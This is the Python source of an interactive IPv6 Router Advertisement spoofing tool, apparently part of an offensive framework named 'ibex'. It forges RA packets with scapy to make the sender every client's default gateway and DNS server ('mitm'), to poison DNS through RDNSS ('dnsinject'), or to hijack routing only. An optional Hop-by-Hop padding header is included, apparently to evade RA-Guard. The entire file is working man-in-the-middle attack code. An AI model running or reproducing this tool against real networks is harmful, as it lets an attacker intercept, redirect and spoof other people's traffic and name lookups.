# spoof.py

import time
import threading
import subprocess
from cmd import Cmd
import netifaces
import ipaddress
from colorama import Fore
from scapy.all import (
    IPv6,
    ICMPv6ND_RA,
    ICMPv6NDOptSrcLLAddr,
    ICMPv6NDOptPrefixInfo,
    ICMPv6NDOptRDNSS,
    IPv6ExtHdrHopByHop,
    Pad1,
    PadN,
    send
)
import warnings
warnings.filterwarnings("ignore", category=SyntaxWarning)

_spoof_state = None
_hbh_enabled = False

# Predefined spoofing modes
MODE_PRESETS = {
    "mitm": {
        "lifetime": 300,
        "dns_lifetime": 300,
        "prefix": "2001:db8:1::",
        "interval": 2,
        "description": "Full attack: route + DNS spoofing",
        "warning": [
            "[!] You are now the default gateway.",
            "[!] All IPv6 traffic will flow through you.",
            "[!] You are also the DNS server for all clients."
        ]
    },
    "dnsinject": {
        "lifetime": 0,
        "dns_lifetime": 300,
        "prefix": "2001:db8:1::",
        "interval": 2,
        "description": "DNS poisoning only (no routing)",
        "warning": [
            "[!] You are injecting DNS via RDNSS, but not routing traffic.",
            "[!] Clients will trust your DNS but route via real gateway."
        ]
    },
    "routeronly": {
        "lifetime": 300,
        "dns_lifetime": 0,
        "prefix": "2001:db8:1::",
        "interval": 2,
        "description": "Default gateway only",
        "warning": [
            "[!] You are acting as default gateway.",
            "[!] No DNS spoofing is performed."
        ]
    },
    "off": {
        "description": "Revert mode"
    }
}

# from Deftones - My Own Summer (Shove It) (HBH Payload)
hbh_payload = "I think God is moving its tongue. There's no crowds in the street and no sun. In my own summer"

# RA Spoofer engine
class RASpoofer:
    def __init__(self):
        self.interface = None
        self.mac = None
        self.llip = None
        self.prefix = "2001:db8:1::"
        self.dns = []
        self.lifetime = 300
        self.dns_lifetime = 300
        self.interval = 2
        self.running = False
        self.packet_count = 0
        self.thread = None
        self.mode = None

    def send_ra(self, router_lifetime, dns_lifetime):
        if not all([self.interface, self.mac, self.llip]):
            return

        base_pkt = (
            ICMPv6ND_RA(routerlifetime=router_lifetime)
            / ICMPv6NDOptSrcLLAddr(lladdr=self.mac)
            / ICMPv6NDOptPrefixInfo(
                prefixlen=64,
                prefix=self.prefix,
                validlifetime=86400,
                preferredlifetime=14400,
                L=1, A=1
            )
        )

        if self.dns:
            base_pkt /= ICMPv6NDOptRDNSS(dns=self.dns, lifetime=dns_lifetime)

        if _hbh_enabled:
            hbh = IPv6ExtHdrHopByHop(options=[
                Pad1(), PadN(optdata=hbh_payload.encode()[:248])
            ])
            pkt = IPv6(dst="ff02::1", src=self.llip, hlim=255) / hbh / base_pkt
        else:
            pkt = IPv6(dst="ff02::1", src=self.llip, hlim=255) / base_pkt

        send(pkt, iface=self.interface, verbose=False)
        self.packet_count += 1

    def start(self):
        if not all([self.interface, self.mac, self.llip]):
            print(Fore.RED + "[!] Set interface, mac and llip first")
            return
        if self.running:
            print(Fore.YELLOW + "[!] Already running")
            return
        self.running = True
        self.thread = threading.Thread(target=self._loop)
        self.thread.daemon = True
        self.thread.start()
        self.send_ra(self.lifetime, self.dns_lifetime)

    def stop(self):
        self.send_ra(0, 0)
        if self.running:
            self.running = False
            print(Fore.YELLOW + f"[*] {self.mode} attack stopped")

    def _loop(self):
        while self.running:
            self.send_ra(self.lifetime, self.dns_lifetime)
            time.sleep(self.interval)

# Mode manager
class ModeManager:
    def __init__(self):
        global _spoof_state
        if _spoof_state:
            self.modes = _spoof_state.modes
            self.current_mode = _spoof_state.current_mode
        else:
            self.modes = {}
            for name in MODE_PRESETS:
                if name != "off":
                    sp = RASpoofer()
                    sp.mode = name
                    self.modes[name] = sp
            self.current_mode = "off"
            _spoof_state = self

    def set_mode(self, mode):
        if mode not in MODE_PRESETS:
            print(Fore.RED + f"[!] Unknown mode: {mode}")
            return
        self.current_mode = mode
        if mode == "off":
            self.stop_all()
            print(Fore.YELLOW + "[!] All attacks stopped")
            return
        spoofer = self.modes[mode]
        preset = MODE_PRESETS[mode]
        spoofer.lifetime = preset.get("lifetime", 0)
        spoofer.dns_lifetime = preset.get("dns_lifetime", 0)
        spoofer.prefix = preset.get("prefix", "2001:db8:1::")
        spoofer.interval = preset.get("interval", 2)

        print(Fore.GREEN + f"[*] Mode set to {mode}")
        print(Fore.GREEN + "[*] Applied:")
        for k in ["lifetime", "dns_lifetime", "prefix", "interval"]:
            print(f"    - {k}: {preset[k]}")
        for line in preset.get("warning", []):
            print(Fore.YELLOW + "    " + line)

    def get_all_status(self):
        return self.modes

    def stop(self, mode):
        if mode not in self.modes:
            print(Fore.RED + f"[!] Unknown mode: {mode}")
            return
        self.modes[mode].stop()

    def stop_all(self):
        for mod in self.modes.values():
            mod.stop()

# Subshell for each spoofing mode
class ModeShell(Cmd):
    def __init__(self, mode, manager: ModeManager):
        super().__init__()
        self.mode = mode
        self.manager = manager
        self.sp = manager.modes[mode]
        self.prompt = f"ibex spoofing {mode}> "

    def do_start(self, arg):
        self.sp.start()

    def do_stop(self, arg):
        self.sp.stop()

    def do_show(self, arg):
        print(Fore.YELLOW + f"\n[*] Current config ({self.mode}):\n")
        for attr in ["interface", "mac", "llip", "prefix", "dns", "lifetime", "dns_lifetime", "interval", "packet_count"]:
            print(f"  {attr}: {getattr(self.sp, attr)}")
        print()

    def do_set(self, arg):
        parts = arg.strip().split()
        if len(parts) < 2:
            print(Fore.RED + "[!] Usage: set <param> <value>")
            return
        param, value = parts[0], parts[1:]

        try:
            if param == "interface":
                self.sp.interface = value[0]
                self._autofill()
            elif param == "mac":
                self.sp.mac = value[0]
            elif param == "llip":
                self.sp.llip = value[0]
            elif param == "prefix":
                self.sp.prefix = value[0]
            elif param == "dns":
                validated = []
                for v in value:
                    try:
                        ipaddress.IPv6Address(v)
                        validated.append(v)
                    except ValueError:
                        print(Fore.RED + f"[!] Invalid IPv6 address: {v}")
                if validated:
                    self.sp.dns = validated
                else:
                    print(Fore.RED + "[!] No valid IPv6 addresses provided for DNS")
            elif param == "lifetime":
                self.sp.lifetime = int(value[0])
            elif param == "dnslifetime":
                self.sp.dns_lifetime = int(value[0])
            elif param == "interval":
                self.sp.interval = int(value[0])
            else:
                print(Fore.RED + "[!] Unknown parameter")
        except:
            print(Fore.RED + "[!] Failed to set parameter")

    def _autofill(self):
        try:
            addrs = netifaces.ifaddresses(self.sp.interface)
            self.sp.mac = addrs.get(netifaces.AF_LINK, [{}])[0].get("addr")
            for entry in addrs.get(netifaces.AF_INET6, []):
                if entry["addr"].startswith("fe80"):
                    self.sp.llip = entry["addr"].split("%")[0]
                    break
            print(Fore.GREEN + f"[*] Autofilled MAC:  {self.sp.mac}")
            print(Fore.GREEN + f"[*] Autofilled LLIP: {self.sp.llip}")
        except Exception as e:
            print(Fore.RED + f"[!] Failed to autofill: {e}")

    def do_exit(self, arg):
        return True

    def emptyline(self):
        pass

    def complete_set(self, text, line, begidx, endidx):
        opts = ['interface', 'mac', 'llip', 'prefix', 'dns', 'lifetime', 'dnslifetime', 'interval']
        parts = line.strip().split()
        if len(parts) == 2:
            return [o for o in opts if o.startswith(text)]
        return []

# Spoofing main shell
class SpoofingShell(Cmd):
    def __init__(self):
        super().__init__()
        self.manager = ModeManager()
        self.prompt = "ibex spoofing> "

    def complete_mode(self, text, line, begidx, endidx):
        opts = list(MODE_PRESETS.keys()) + ['list']
        return [o for o in opts if o.startswith(text)]

    def complete_stop(self, text, line, begidx, endidx):
        opts = list(MODE_PRESETS.keys())
        opts.remove('off')
        opts.append('all')
        return [o for o in opts if o.startswith(text)]

    def complete_enable(self, text, line, begidx, endidx):
        return [o for o in ['hbh'] if o.startswith(text)]

    def complete_disable(self, text, line, begidx, endidx):
        return [o for o in ['hbh'] if o.startswith(text)]

    def complete_status(self, text, line, begidx, endidx):
        return [o for o in ['hbh'] if o.startswith(text)]

    def preloop(self):
        # Environment checks
        nat64_ok = subprocess.run("pidof tayga", shell=True, stdout=subprocess.DEVNULL).returncode == 0
        dns64_ok = subprocess.run("pidof named", shell=True, stdout=subprocess.DEVNULL).returncode == 0

        if nat64_ok:
            print(Fore.GREEN + "[✓] NAT64 (tayga) is running.")
        else:
            print(Fore.YELLOW + "[!] NAT64 is not running: Keep this in mind when deciding what kind of attack to use.")

        if dns64_ok:
            print(Fore.GREEN + "[✓] DNS64 (named) is running.")
        else:
            print(Fore.YELLOW + "[!] DNS64 is not running: Keep this in mind when deciding what kind of attack to use.")

    def do_mode(self, arg):
        args = arg.strip().split()
        if not args:
            print(Fore.RED + "[!] Usage: mode <list|mitm|dnsinject|routeronly|off>")
            return
        if args[0] == "list":
            print(Fore.YELLOW + "\n[*] Available modes:\n")
            for name, data in MODE_PRESETS.items():
                print(f"  {name.ljust(12)} → {data['description']}")
            print()
        elif args[0] not in MODE_PRESETS:
            print(Fore.RED + f"[!] Unknown mode: {args[0]}")
        else:
            self.manager.set_mode(args[0])
            if args[0] != "off":
                ModeShell(args[0], self.manager).cmdloop()

    def do_status(self, arg):
        if arg.strip().lower() == "hbh":
            print(Fore.YELLOW + "\n[*] Hop-by-Hop status:\n")
            print("  Enabled:  " + ("Yes" if _hbh_enabled else "No"))
            return

        print(Fore.YELLOW + "\n[*] Active attack status:\n")
        for name, mod in self.manager.get_all_status().items():
            print(Fore.CYAN + f"  [{name}]")
            print(f"    Running:   {'Yes' if mod.running else 'No'}")
            print(f"    Interface: {mod.interface}")
            print(f"    Prefix:    {mod.prefix}")
            print(f"    Packets:   {mod.packet_count}")
            print(f"    DNS:       {', '.join(mod.dns) if mod.dns else 'None'}\n")

    def do_stop(self, arg):
        args = arg.strip().split()
        if not args:
            print(Fore.RED + "[!] Usage: stop <mitm|dnsinject|routeronly|all>")
            return
        if args[0] == "all":
            self.manager.stop_all()
        else:
            self.manager.stop(args[0])

    def do_enable(self, arg):
        global _hbh_enabled
        arg = arg.strip().lower()
        if arg == "hbh":
            _hbh_enabled = True
            print(Fore.GREEN + "[!] Hop-by-Hop header enabled")
        elif not arg:
            print(Fore.RED + "[!] Usage: enable <feature>")
            print(Fore.YELLOW + "    Available features: hbh")
        else:
            print(Fore.RED + f"[!] Unknown feature: {arg}")

    def do_disable(self, arg):
        global _hbh_enabled
        arg = arg.strip().lower()
        if arg == "hbh":
            _hbh_enabled = False
            print(Fore.GREEN + "[!] Hop-by-Hop header disabled")
        elif not arg:
            print(Fore.RED + "[!] Usage: disable <feature>")
            print(Fore.YELLOW + "    Available features: hbh")
        else:
            print(Fore.RED + f"[!] Unknown feature: {arg}")

    def do_help(self, arg):
        print(Fore.YELLOW + "\nAvailable commands:\n")
        print("  mode list             Show available spoofing modes")
        print("  mode <name>           Enter spoofing mode shell")
        print("  status                Show all spoofing statuses")
        print("  status hbh            Show Hop-by-Hop status")
        print("  stop <mode|all>       Stop spoofing attack(s)")
        print("  enable hbh            Enable Hop-by-Hop header injection")
        print("  disable hbh           Disable Hop-by-Hop header injection")
        print("  exit                  Return to ibex shell\n")

    def do_exit(self, arg):
        return True

    def emptyline(self):
        pass

# Debug entry point
if __name__ == "__main__":
    SpoofingShell().cmdloop()